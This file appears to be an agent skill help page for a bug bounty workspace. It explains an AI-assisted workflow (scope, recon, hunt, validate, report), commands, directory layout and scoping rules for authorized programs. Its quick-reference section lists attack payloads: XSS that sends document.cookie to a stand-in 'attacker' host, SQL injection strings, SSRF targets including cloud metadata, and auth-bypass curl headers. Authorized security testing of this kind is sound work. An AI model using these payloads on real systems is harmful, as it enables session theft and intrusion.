---
name: hunt-help
description: >
  Meta-skill: explains the entire ai-bug-bounty-hunter workflow, command map,
  directory layout, golden rules, and typical session flow. Use when the user
  is new to the workspace, asks "how do I start?", "what can you do?",
  "help", "/help", "/hunt-help", "where do I begin", or "explain this repo".
license: Apache-2.0
metadata:
  author: gentleman-programming
  version: "1.0"
---

## When to Use

- User is new to the workspace and asks "how do I start?"
- User says "help", "/help", "/hunt-help", "what can you do?"
- User asks "where do I begin", "explain this repo", "what's in here"
- Onboarding a new operator onto a public bounty program
- Building a quick mental model of the 4-phase workflow

This is a meta-skill. It does not perform any recon or hunting itself —
it routes the operator to the right skill for the task.

---

## 1. What this workspace is

`ai-bug-bounty-hunter` is a template repo for AI-assisted bug bounty
hunting against public programs (HackerOne, Bugcrowd, Intigriti, Immunefi,
and equivalents) that have published written safe-harbor terms.

It is **not**:

- A pentest deliverable template.
- A scanner farm — automation has the highest duplicate rate.
- A red-team / adversary-emulation framework.
- Authorized for testing anything not on a published scope.

It is:

- A method-driven workspace with rules that fire every session
  (`rules/hunting.md`, `rules/reporting.md`).
- A skills library that turns each phase of the workflow into a
  repeatable procedure (`.claude/skills/`).
- A curated payload library (`payloads/`) and wordlists (`wordlists/`).
- A methodology library (`methodology/`) with auth matrices and focused
  playbooks for high-signal manual testing.
- A per-target workspace scaffold (`programs/{target}/`) for evidence
  and findings.

---

## 2. The 4-phase workflow

```
SCOPE  →  RECON  →  HUNT  →  VALIDATE  →  REPORT
   │         │         │          │           │
   │         │         │          │           └→ programs/{target}/vulns/confirmed/
   │         │         │          └→ programs/{target}/vulns/poc/
   │         │         └→ programs/{target}/vulns/nuclei-results.txt
   │         └→ programs/{target}/recon/
   └→ config/{target}-scope.md
```

| Phase | Skill | What it produces |
|---|---|---|
| SCOPE | `bug-bounty-init` (sets up scope file) | `config/{target}-scope.md`, `programs/{target}/scope.md` |
| RECON | `bug-bounty-recon` | `programs/{target}/recon/*` (subdomains, live hosts, ports, tech, endpoints) |
| HUNT  | `bug-bounty-hunt`, `bug-bounty-sqlmap` | `programs/{target}/vulns/*` (raw scanner output) |
| VALIDATE | `bug-bounty-validate` | `programs/{target}/vulns/poc/*` (proof of exploit) |
| REPORT  | `bug-bounty-report` | `reports/{program}.md` (HackerOne-ready report) |

> Skipping a phase almost always wastes time later. A bug found in HUNT
> that fails VALIDATE is just noise.

---

## 3. Available commands

Every command is a skill. The slash form (`/init`) is the conventional
trigger; the description in each `SKILL.md` also lists natural-language
phrases the agent will match.

| Command | Skill | One-line purpose |
|---|---|---|
| `/hunt-help` | `hunt-help` (this skill) | Explain the workflow, list commands, show layout |
| `/init <target> <program>` | `bug-bounty-init` | Create `programs/{target}/` scaffold and scope file |
| `/recon <target>` | `bug-bounty-recon` | Subdomain enum, live hosts, ports, tech, endpoints |
| `/hunt <target>` | `bug-bounty-hunt` | Multi-vector testing (XSS, SQLi, IDOR, SSRF, RCE, auth bypass) |
| `/sqlmap <request>` | `bug-bounty-sqlmap` | Safe SQLMap usage with bug-bounty guardrails |
| `/validate <finding>` | `bug-bounty-validate` | Confirm exploitability, quantify impact |
| `/report <finding>` | `bug-bounty-report` | Write HackerOne-style report with business impact |

### Helper scripts (no AI required)

| Script | Purpose |
|---|---|
| `tools/scripts/recon.sh <target>` | Run the recon pipeline from the shell |
| `tools/scripts/hunt.sh <target>` | Run the hunt pipeline from the shell |
| `tools/scripts/check-env.sh` | Check required Kali/tooling dependencies without installing anything |
| `tools/scripts/new-finding.sh <severity> <type> <title> [target]` | Create a safe HackerOne-style finding draft |

### Reference material

| Resource | Where |
|---|---|
| Methodology rules | `rules/hunting.md`, `rules/reporting.md` |
| Manual methodology | `methodology/` (auth matrix, API, IDOR/BOLA, ATO, OAuth/SSO, business logic playbooks) |
| Target templates | `templates/target/` (auth matrix, hunt session, evidence log) |
| Curated payloads | `payloads/*.md` (XSS, SQLi, SSRF, IDOR, JWT, OAuth, SSTI, LFI, XXE, auth bypass, cmd injection) |
| Dork cheat sheets | `tools/dorks/google-dorks.md`, `tools/dorks/github-dorks.md`, `tools/dorks/shodan-dorks.md` |
| Wordlists | `wordlists/common.txt`, `wordlists/params.txt`, `wordlists/api-endpoints.txt`, `wordlists/sensitive-files.txt` |
| SQLMap cheatsheet | `tools/sqlmap-cheatsheet.md` |
| Nuclei templates | `tools/nuclei-templates/` |

---

## 4. Typical session flow

A real session for a fresh target on a public HackerOne program looks
like this. Numbers in brackets are rough time-boxes.

```
[1]  Confirm program is in scope
     "Read https://hackerone.com/<program>/policy and tell me
      whether *.acme.com is in scope."

[2]  Initialize the workspace
     /init acme.com <program>
     → creates programs/acme.com/{scope,notes}.md and recon/ skeleton

[3]  Run recon
     /recon acme.com
     → fills programs/acme.com/recon/{subdomains,live-hosts,ports,tech,endpoints}.txt
     (or: tools/scripts/recon.sh acme.com)

[4]  Triage the recon output
     "Show me the top 10 most interesting subdomains and what
      tech stack each one runs."

[5]  Hunt
     /hunt acme.com --xss --sqli --idor
     (or: tools/scripts/hunt.sh acme.com)
     → fills programs/acme.com/vulns/*

     For auth, IDOR/BOLA, account takeover, OAuth/SSO, API, or business
     logic testing, open the matching `methodology/*-playbook.md` first.
     Use `methodology/auth-matrix.md` or `templates/target/auth-matrix.md`
     when testing multiple roles, tenants, ownership states, or privilege
     boundaries. The matrix prevents missed negative controls and makes
     validation evidence easier to report.

[6]  Validate each lead
     /validate sqli in /api/products?id= on api.acme.com
     → saves PoC to programs/acme.com/vulns/poc/

[7]  A→B signal
     "If the SQLi is real, check every /api/* endpoint that
      takes an id parameter — sibling rule."

[8]  Report
     /report sqli in /api/products?id=
     → appends a HackerOne-style report to reports/<program>.md

[9]  Update the tracker
     "Mark the SQLi as REPORTED in programs/acme.com/vulns/tracker.md"
```

---

## 5. Where things live

```
.
├── README.md                       # workspace overview
├── CLAUDE.md                       # agent persona (always-on)
├── Makefile                        # install / update wordlists & templates
│
├── .claude/skills/                 # all skills live here
│   ├── hunt-help/                  # this file
│   ├── bug-bounty-init/
│   ├── bug-bounty-recon/
│   ├── bug-bounty-hunt/
│   ├── bug-bounty-validate/
│   ├── bug-bounty-report/
│   └── bug-bounty-sqlmap/
│
├── rules/                          # always-on methodology
│   ├── hunting.md                  # 20 rules — read before every hunt
│   └── reporting.md                # 12 rules — read before every report
│
├── methodology/                    # auth matrix + manual testing playbooks
│
├── payloads/                       # curated payload library (per class)
│
├── wordlists/                      # compact starter wordlists
│
├── tools/
│   ├── dorks/                      # google / github / shodan dorks
│   ├── scripts/                    # recon.sh, hunt.sh, check-env.sh, new-finding.sh
│   ├── sqlmap-cheatsheet.md
│   └── nuclei-templates/
│
├── templates/target/               # reusable target docs and evidence logs
│
├── config/                         # per-program & per-tool config
│
├── programs/                       # per-target workspaces
│   └── {target}/
│       ├── scope.md
│       ├── notes.md
│       ├── recon/                  # recon artifacts (live-hosts, etc.)
│       ├── screenshots/
│       └── vulns/
│           ├── tracker.md          # one row per finding, status column
│           ├── findings.md         # consolidated findings
│           └── poc/                # proof-of-concept files
│
└── reports/                        # generated reports (per program)
```

### Conventions

- **Target naming.** Lowercase, no protocol. `acme.com`, not
  `https://acme.com`. Subdomains are targets of their own:
  `api.acme.com`, `admin.acme.com`.
- **Scope files** live in `config/{target}-scope.md` and
  `programs/{target}/scope.md` (in-scope + out-of-scope lists quoted
  from the program policy).
- **Findings** live in `programs/{target}/vulns/tracker.md` with a
  status column: `NEW`, `VALIDATED`, `REPORTED`, `DUPLICATE`,
  `CLOSED`, `RESOLVED`, `INVALID`.
- **Reports** go in `reports/{program}.md`, sorted by business impact.
- **Evidence** lives next to the finding in
  `programs/{target}/vulns/poc/` (HTTP logs, screenshots, payloads).
- **Never commit real user data.** Strip or redact PII before commit.

---

## 6. The golden rules

From `rules/hunting.md` — the non-negotiables. Read the whole file
before your first hunt.

1. **Read full scope first.** One out-of-scope request = potential ban.
   Verify every asset against `programs/{target}/scope.md`.
2. **Never hunt theoretical bugs.** "Can an attacker do this RIGHT NOW,
   against a real user, causing real harm?" If no — stop.
3. **Kill weak findings fast.** 30-second check, 7-question gate. One
   NO = kill the finding. A weak finding wastes more time than a
   missed one.
4. **Validate before writing.** Run `/validate` before spending 30
   minutes on a report. The validate step takes 30 seconds.
5. **Automation = highest duplicate rate.** Use automation for recon
   only. Manual testing finds unique bugs. Automated scanners find
   duplicates.

---

## 7. Common mistakes

Things that consistently waste time or get reports closed as N/A:

- **"I found a potential XSS"** without a working PoC → Informational
  at best. Always show the exfil, not the alert.
- **Reporting missing headers as standalone bugs** (CSP, HSTS, X-Frame)
  → almost always N/A. Chain with a real finding or skip.
- **Self-XSS, open redirect, GraphQL introspection alone** → N/A on
  most programs. See `rules/reporting.md` #5 for the always-rejected
  list.
- **Running `nuclei -severity critical` and submitting the output
  verbatim** → duplicate factory, not a hunt. Triage every line.
- **Speculating with "could lead to" or "might allow"** → kills
  report credibility. State the action definitively or kill the
  finding.
- **Exfiltrating more data than the PoC needs** → breaks the
  safe-harbor clause. A few rows of proof is enough.
- **Re-testing resolved findings** without checking the program's
  re-test policy first.
- **Forgetting to update `tracker.md`** after status changes.

---

## 8. Quick reference

### Payload cheat sheet (see `payloads/` for the full list)

```
# XSS (reflected/stored)
<script>alert(1)</script>
<img src=x onerror=alert(document.domain)>
"><svg/onload=fetch('//attacker/?c='+document.cookie)>

# SQLi (basic)
' OR '1'='1
' UNION SELECT NULL--
1' AND (SELECT SLEEP(5))--

# SSRF
http://127.1/
http://169.254.169.254/latest/meta-data/
http://[::1]/

# IDOR (test pattern)
curl -b "<user_a_session>" https://target.com/api/resource/<user_b_id>

# Auth bypass
curl -H "X-Original-URL: /admin" https://target.com/
curl -H "X-Forwarded-For: 127.0.0.1" https://target.com/admin
```

### Severity table (CVSS 3.1 aligned)

| Rating | Typical bugs |
|---|---|
| Critical | RCE, SQLi with data extraction, auth bypass on admin endpoints |
| High | IDOR with PII access, SSRF to cloud metadata, stored XSS with ATO |
| Medium | Reflected XSS without ATO, CSRF on non-sensitive action, missing MFA |
| Low | Informational, best-practice violations, self-DoS |

### Scope check (run before any request)

```
[ ]  Asset is on the in-scope list (programs/{target}/scope.md)
[ ]  Bug class is not on the program's exclusion list
[ ]  Program has published safe-harbor terms
[ ]  Rate / impact limits in the program policy are respected
[ ]  Evidence directory programs/{target}/vulns/ exists
```

---

## Auto-Resolution

This skill auto-resolves from:

- `/hunt-help`, `/help`, "help", "what can you do?"
- "where do I start", "explain this repo", "what's in here"
- "how do I use this workspace", "list commands"
- "I'm new, walk me through it"

If the user is asking for *one specific* action (init, recon, hunt,
validate, report), route them to that skill — don't dump this whole
file.
